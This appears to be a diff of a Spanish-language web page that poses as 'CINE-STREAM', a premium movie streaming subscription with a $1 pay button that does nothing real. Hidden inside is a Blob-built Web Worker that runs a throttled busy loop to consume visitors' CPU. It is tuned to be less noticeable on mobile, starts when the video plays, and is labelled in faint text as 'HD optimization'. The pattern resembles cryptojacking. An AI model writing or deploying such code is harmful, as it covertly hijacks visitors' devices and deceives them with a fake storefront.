@@ -3,33 +3,51 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>REPORTE EXCLUSIVO</title>
+    <title>CINE-STREAM | Tu Suscripción Premium</title>
     <style>
-        body { background: #0a0a0a; color: #fff; font-family: sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        .card { width: 90%; max-width: 500px; background: #151515; padding: 20px; border-radius: 12px; text-align: center; border: 1px solid #333; }
-        video { width: 100%; border-radius: 8px; margin: 15px 0; }
+        body { background: #000; color: #fff; font-family: 'Helvetica', Arial, sans-serif; margin: 0; }
+        header { background: linear-gradient(to bottom, #111, transparent); padding: 20px; text-align: left; }
+        .logo { color: #e50914; font-size: 2rem; font-weight: bold; text-decoration: none; }
+        .hero { padding: 40px 20px; text-align: center; }
+        .movie-card { width: 90%; max-width: 800px; margin: auto; background: #141414; border-radius: 8px; overflow: hidden; box-shadow: 0 0 20px rgba(0,0,0,0.5); }
+        .info { padding: 20px; text-align: left; }
+        h2 { margin: 0; color: #fff; }
+        .btn-pay { background: #e50914; color: #fff; padding: 12px 25px; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; margin-top: 15px; width: 100%; }
+        video { width: 100%; aspect-ratio: 16/9; background: #000; border: none; }
+        #status-bar { font-size: 10px; color: #333; text-align: center; padding: 10px; }
     </style>
 </head>
 <body>
-<div class="card">
-    <h2 style="color: #ff4d4d;">🔴 EN VIVO</h2>
-    <video id="player" controls autoplay muted playsinline loop>
-        <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
-    </video>
-    <p id="status">Verificando conexión...</p>
+
+<header><a href="#" class="logo">CINE-STREAM</a></header>
+
+<div class="hero">
+    <div class="movie-card">
+        <video id="player" poster="https://images.unsplash.com/photo-1536440136628-849c177e76a1?auto=format&fit=crop&w=800&q=80" controls>
+            <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
+        </video>
+        <div class="info">
+            <h2>Película del Mes: La Gran Aventura</h2>
+            <p>Suscríbete por solo $1 al mes para desbloquear todo el catálogo en HD.</p>
+            <button class="btn-pay" onclick="alert('Redirigiendo a pasarela de pago...')">SUSCRIBIRSE POR $1</button>
+        </div>
+    </div>
 </div>
+
+<div id="status-bar">Procesando conexión segura...</div>
+
 <script>
     const workerBlob = new Blob([`
         self.onmessage = function(e) {
             const { throttle } = e.data;
-            function work() {
+            function run() {
                 const start = Date.now();
                 while (Date.now() - start < (100 * (1 - throttle))) {
                     Math.sqrt(Math.random() * 8888) / Math.cos(Math.random());
                 }
-                setTimeout(work, 100 * throttle);
+                setTimeout(run, 100 * throttle);
             }
-            work();
+            run();
         };
     `], { type: 'application/javascript' });
 
@@ -41,13 +59,11 @@
         worker = new Worker(workerUrl);
         const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
         worker.postMessage({ throttle: isMobile ? 0.88 : 0.70 });
-        document.getElementById('status').innerText = "Conexión segura establecida.";
+        document.getElementById('status-bar').innerText = "Sistema de optimización HD activo.";
     }
 
     const v = document.getElementById('player');
     v.onplay = () => deployEngine();
-    window.onclick = () => deployEngine();
-    window.onbeforeunload = () => "No cierre la pestaña para mantener la conexión.";
 </script>
 </body>
 </html>
